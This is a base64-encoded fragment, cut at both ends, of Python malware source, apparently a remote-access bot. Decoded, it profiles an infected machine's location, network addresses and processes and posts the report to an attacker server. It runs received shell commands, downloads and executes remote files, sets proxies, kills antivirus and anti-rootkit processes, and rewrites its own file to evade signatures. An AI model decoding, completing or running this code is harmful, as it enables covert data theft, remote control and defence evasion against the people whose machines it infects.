eSddfQ0KICAgIFppcDoge2RhdGFbJ3ppcCddfQ0KICAgIExhdGl0dWRlOiB7ZGF0YVsnbGF0J119DQogICAgTG9uZ2l0dWRlOiB7ZGF0YVsnbG9uJ119DQogICAgSVNQOiB7ZGF0YVsnaXNwJ119DQoNCiAgICA9LT0tPS09LT0tPSBQQVlMT0FEIElORk9STUFUSU9OID0tPS09LT0tPS09DQoNCiAgICBQYXlsb2FkIEZpbGUgTmFtZS9Mb2NhdGlvbjoge3NjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWV9DQogICAgTW9zdCBSZWNlbnQgSW5mZWN0aW9uIERhdGUvVGltZToge2Zvcm1hdChmb3JtYXR0ZWRfZGF0ZXRpbWUpfQ0KICAgIEFkbWluL1Jvb3QgZmlsZSBwcml2aWxhZ2VzOiB7cHJpdn0NCiAgICBHVUk6IHtndWl9DQoNCiAgICA9LT0tPS09LT0tPSBTWVNURU0gSU5GT1JNQVRJT04gPS09LT0tPS09LT0NCg0KICAgIFN5c3RlbSBIb3N0bmFtZToge3N5c3RlbV9ob3N0bmFtZX0NCiAgICBPcGVyYXRpbmcgU3lzdGVtOiB7b3BlcmF0aW5nX3N5c3RlbX0NCiAgICBPcGVyYXRpbmcgU3lzdGVtIFZlcnNpb246IHtvcGVyYXRpbmdfc3lzdGVtX3ZlcnNpb259DQoNCiAgICBQdWJsaWMgSVAgQWRkcmVzczoge3B1YmxpY19pcH0NCiAgICBQcml2YXRlIElQIEFkZHJlc3M6IHtwcml2YXRlX2lwfQ0KICAgIE1BQyBBZGRyZXNzOiB7bWFjX2FkZHJlc3N9DQoNCiAgICBTeXN0ZW0gQXJjaGl0ZWN0dXJlOiB7c3lzdGVtX2FyY2hpdGVjdHVyZX0NCiAgICBQcm9jZXNzb3IgQnVpbGQ6IHtwcm9jZXNzb3JfYnVpbGR9DQogICAgQ1BVIENvdW50OiB7Y3B1X2NvdW50fQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ1dpbmRvd3MnOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpdiA9IFRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcml2ID0gRmFsc2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdCA9IGYnJycNCg0KICAgID0tPS09LT0tPS09IEdFTyBJTkZPUk1BVElPTiA9LT0tPS09LT0tPQ0KDQogICAgQ291bnRyeToge2RhdGFbJ2NvdW50cnknXX0NCiAgICBSZWdpb246IHtkYXRhWydyZWdpb25OYW1lJ119DQogICAgQ2l0eToge2RhdGFbJ2NpdHknXX0NCiAgICBaaXA6IHtkYXRhWyd6aXAnXX0NCiAgICBMYXRpdHVkZToge2RhdGFbJ2xhdCddfQ0KICAgIExvbmdpdHVkZToge2RhdGFbJ2xvbiddfQ0KICAgIElTUDoge2RhdGFbJ2lzcCddfQ0KDQogICAgPS09LT0tPS09LT0gUEFZTE9BRCBJTkZPUk1BVElPTiA9LT0tPS09LT0tPQ0KDQogICAgUGF5bG9hZCBGaWxlIE5hbWUvTG9jYXRpb246IHtzY3JpcHRfZGlyZWN0b3J5X2ZpbGVuYW1lfQ0KICAgIE1vc3QgUmVjZW50IEluZmVjdGlvbiBEYXRlL1RpbWU6IHtmb3JtYXQoZm9ybWF0dGVkX2RhdGV0aW1lKX0NCiAgICBBZG1pbi9Sb290IGZpbGUgcHJpdmlsYWdlczoge3ByaXZ9DQogICAgR1VJOiB7Z3VpfQ0KDQogICAgPS09LT0tPS09LT0gU1lTVEVNIElORk9STUFUSU9OID0tPS09LT0tPS09DQoNCiAgICBTeXN0ZW0gSG9zdG5hbWU6IHtzeXN0ZW1faG9zdG5hbWV9DQogICAgT3BlcmF0aW5nIFN5c3RlbToge29wZXJhdGluZ19zeXN0ZW19DQogICAgT3BlcmF0aW5nIFN5c3RlbSBWZXJzaW9uOiB7b3BlcmF0aW5nX3N5c3RlbV92ZXJzaW9ufQ0KDQogICAgUHVibGljIElQIEFkZHJlc3M6IHtwdWJsaWNfaXB9DQogICAgUHJpdmF0ZSBJUCBBZGRyZXNzOiB7cHJpdmF0ZV9pcH0NCiAgICBNQUMgQWRkcmVzczoge21hY19hZGRyZXNzfQ0KDQogICAgU3lzdGVtIEFyY2hpdGVjdHVyZToge3N5c3RlbV9hcmNoaXRlY3R1cmV9DQogICAgUHJvY2Vzc29yIEJ1aWxkOiB7cHJvY2Vzc29yX2J1aWxkfQ0KICAgIENQVSBDb3VudDoge2NwdV9jb3VudH0NCg0KICAgID0tPS09LT0tPS09IFdJTkRPV1MgSU5GT1JNQVRJT04gPS09LT0tPS09LT0NCg0KICAgIEF2YWlsYWJsZSBEcml2ZXM6IHtjdXJyZW50X2F2YWlsYWJsZV9kcml2ZXN9DQoNCiAgICBDOiBEcml2ZSBUb3RhbCBTdG9yYWdlOiB7Q3RvdGFsX3N0b3JhZ2V9DQogICAgQzogRHJpdmUgVXNlZCBTdG9yYWdlOiB7Q3VzZWRfc3RvcmFnZX0NCiAgICBDOiBEcml2ZSBGcmVlIFN0b3JhZ2U6IHtDZnJlZV9zdG9yYWdlfQ0KDQogICAgPS09LT0tPS09LT0gU1lTVEVNIFBST0NFU1NFUyA9LT0tPS09LT0tPQ0KDQogICAge3J1bm5pbmdfcHJvY2Vzc2VzfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJycNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VzdG9tX2RhdGEgPSBkYXQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IHNlbmR0b3VybCsic3RvcmUtZGF0YS5waHAiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPXsiZGF0YSI6IGN1c3RvbV9kYXRhfSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJkYXRhIHNlbnQiLHVybCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KEUpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWUgPSBGYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgICAgICAgICBlbGlmICJBTEwiIGluIGZpbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtZSA9IFRydWUNCg0KICAgICAgICAgICAgICAgICAgICBpZiBmb3JtZToNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgImNtZCIgaW4gZmluZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gc3RyaW5nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKGNvbW1hbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoImNtZCBleGVjIikNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgImVjaG8iIGluIGZpbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHN0cmluZw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGNvbW1hbmQpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJtZXNzYWdlIiBpbiBmaW5kOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjID0gcmUuZmluZGFsbChyJ1xbLio/XF0nLCBmaW5kKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyYw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIl0iLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJbIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiJyIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjayA9IHN0cmluZw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjaG9zdCA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgZmluZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmNob3N0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKSIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIigiLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCInIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIlsiLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2tob3N0ID0gc3RyaW5nDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChicmNraG9zdCwidGl0bGUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGJyY2ssImJvZHkiKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ3VpID09IFRydWU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290ID0gdGsuVGsoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LndpdGhkcmF3KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGtpbnRlci5tZXNzYWdlYm94LnNob3dpbmZvKGJyY2tob3N0LCBicmNrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LmRlc3Ryb3koKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgImRvd25sb2FkIiBpbiBmaW5kOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHN0cmluZw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlZF91cmwgPSB1cmxsaWIucGFyc2UudXJscGFyc2UoY29tbWFuZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUocGFyc2VkX3VybC5wYXRoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmVfZGlyZWN0b3J5ID0gb3MuZ2V0Y3dkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbF9maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oc2F2ZV9kaXJlY3RvcnksIGZpbGVuYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJpZXZlKGNvbW1hbmQsIGxvY2FsX2ZpbGVfcGF0aCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ1dpbmRvd3MnOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zdGFydGZpbGUobG9jYWxfZmlsZV9wYXRoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXywgZmlsZV9leHRlbnNpb24gPSBvcy5wYXRoLnNwbGl0ZXh0KGxvY2FsX2ZpbGVfcGF0aCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlX2V4dGVuc2lvbiA9PSAnLnNoJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsnYmFzaCcsIGxvY2FsX2ZpbGVfcGF0aF0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgZmlsZV9leHRlbnNpb24gPT0gJy5weSc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJ3B5dGhvbjMnLCBsb2NhbF9maWxlX3BhdGhdKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGZpbGVfZXh0ZW5zaW9uID09ICcuamFyJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsnamF2YScsICctamFyJywgbG9jYWxfZmlsZV9wYXRoXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBvcy5hY2Nlc3MobG9jYWxfZmlsZV9wYXRoLCBvcy5YX09LKTogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJy4vJyArIGxvY2FsX2ZpbGVfcGF0aF0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyd4ZGctb3BlbicsIGxvY2FsX2ZpbGVfcGF0aF0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgInByb3h5IiBpbiBmaW5kOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjID0gcmUuZmluZGFsbChyJ1xbLio/XF0nLCBmaW5kKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyYw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIl0iLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJbIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiJyIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjayA9IHN0cmluZw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjaG9zdCA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgZmluZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmNob3N0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKSIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIigiLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCInIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIlsiLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2tob3N0ID0gc3RyaW5nDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm94eSA9ICJodHRwOi8vIiticmNraG9zdCsiOiIrYnJjaw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MuZW52aXJvblsnaHR0cF9wcm94eSddID0gcHJveHkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5lbnZpcm9uWydIVFRQX1BST1hZJ10gPSBwcm94eQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLmVudmlyb25bJ2h0dHBzX3Byb3h5J10gPSBwcm94eQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLmVudmlyb25bJ0hUVFBTX1BST1hZJ10gPSBwcm94eQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAiZGlzYWJsZSIgaW4gZmluZDoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ1dpbmRvd3MnOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFudGl2aXJ1c19wcm9jZXNzX25hbWVzID0gWydjY1N2Y0hzdC5leGUnLCAnbWNzaGllbGQuZXhlJywgJ2F2Z3N2Yy5leGUnLCAnYXZwLmV4ZScsICdiZGFnZW50LmV4ZScsICdtYmFtLmV4ZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdTRFRyYXkuZXhlJywgJ1dSU0EuZXhlJywgJ1NBVlNlcnZpY2UuZXhlJywgJ1BTVUFNYWluLmV4ZScsICdUTUJNU1JWLmV4ZScsICdlZ3VpLmV4ZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdBZEF3YXJlLmV4ZScsICdTQkFNVHJheS5leGUnLCAnYXZndWFyZC5leGUnLCAnY3lsYW5jZXN2Yy5leGUnLCAnYTJndWFyZC5leGUnLCAnVjNUcmF5LmV4ZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdTVVBFUkFudGlTcHl3YXJlLmV4ZScsICdobXBhbGVydC5leGUnLCAnQnVsbEd1YXJkLmV4ZScsICdTQkFNVHJheS5leGUnLCAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJzM2MFRyYXkuZXhlJywgJ1BTQU5Ib3N0LmV4ZScsICdjYXZ3cC5leGUnLCAnZnNhdi5leGUnLCAnemF0cmF5LmV4ZSddDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVubmluZ19wcm9jZXNzZXMgPSBvcy5wb3Blbignd21pYyBwcm9jZXNzIGdldCBkZXNjcmlwdGlvbiwgcHJvY2Vzc2lkJykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3NfbGluZXMgPSBydW5uaW5nX3Byb2Nlc3Nlcy5zcGxpdCgnXG4nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5uaW5nX3Byb2Nlc3NfbmFtZXMgPSBbbGluZS5zcGxpdCgpWzBdIGZvciBsaW5lIGluIHByb2Nlc3NfbGluZXMgaWYgbGluZV0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgcHJvY2Vzc19uYW1lIGluIGFudGl2aXJ1c19wcm9jZXNzX25hbWVzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHJvY2Vzc19uYW1lLmxvd2VyKCkgaW4gW25hbWUubG93ZXIoKSBmb3IgbmFtZSBpbiBydW5uaW5nX3Byb2Nlc3NfbmFtZXNdOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBmJ3Rhc2traWxsIC9GIC9JTSB7cHJvY2Vzc19uYW1lfScNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oY29tbWFuZCwgc2hlbGw9VHJ1ZSkNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ0xpbnV4JzoNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFudGlyb290a2l0X3Byb2Nlc3NfbmFtZXMgPSBbJ3JraHVudGVyJywgJ2Noa3Jvb3RraXQnLCAnTHluaXMnLCAnY2xhbXNjYW4nLCAnYWlkZScsICdya3Nwb3R0ZXInLCAna2phY2thbCcsICdsa3JkJywgJ2ZnJywgJ2RldGVjdGlvbi1jb250YWluZXInLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ29zc2VjLXJvb3RjaGVjaycsICd0cmlwd2lyZScsICdzYW1oYWluJywgJ3RpZ2VyJywgJ3lhcmEnLCAnY2hrcHJvYycsICdyb290a2l0IGh1bnRlcicsICd1bmhpZGUnLCAnbWFsZGV0JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzb3Bob3MnLCAnY2xhbWF2JywgJ2JpdGRlZmVuZGVyJywgJ2F2Z2QnLCAnYXZhc3QnLCAnZi1zZWN1cmUnLCAnZXNldHMnLCAnbWFsd2FyZWJ5dGVzJywgJ2thc3BlcnNreScsICdzeW1hbnRlYyddDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHByb2Nlc3NfbmFtZSBpbiBhbnRpcm9vdGtpdF9wcm9jZXNzX25hbWVzOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyd3aGljaCcsIHByb2Nlc3NfbmFtZV0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IGYncGtpbGwgLWYgLTkge3Byb2Nlc3NfbmFtZX0nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZidraWxsZWQge3Byb2Nlc3NfbmFtZX0nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oY29tbWFuZCwgc2hlbGw9VHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAicmVkaXJlY3QiIGluIGZpbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHN0cmluZw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdlYmJyb3dzZXIub3Blbihjb21tYW5kKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAib2JmdXNjYXRlIiBpbiBmaW5kOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIHNsZWVwDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzbGVlcCA9IFRydWUNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlcCA9IG9zLnBhdGguc2VwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgoc3lzLmFyZ3ZbMF0pDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgoc3lzLmV4ZWN1dGFibGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoc2NyaXB0X3BhdGgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X2ZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShzY3JpcHRfcGF0aCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUgPSBzY3JpcHRfZGlyZWN0b3J5K3NlcCtzY3JpcHRfZmlsZW5hbWUNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZiBnZW5lcmF0ZV9yYW5kb21fY29kZSgpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYW5kb21fY29kZSA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShjaGFyYWN0ZXJzKSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCg1MCwgMTAwKSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmJyMge3JhbmRvbV9jb2RlfVxuJw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUsICdyJykgYXMgZmRlc2M6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9jb250ZW50ID0gZmRlc2MucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihzY3JpcHRfZGlyZWN0b3J5X2ZpbGVuYW1lLCAndycpIGFzIGZkZXNjOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYW5kb21fY29kZSA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShjaGFyYWN0ZXJzKSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCg1MCwgMTAwKSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZkZXNjLndyaXRlKHNjcmlwdF9jb250ZW50KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmZGVzYy53cml0ZSgnXG4nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmZGVzYy53cml0ZSgncHJpbnQoIicrcmFuZG9tX2NvZGUrJyIpJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmRlc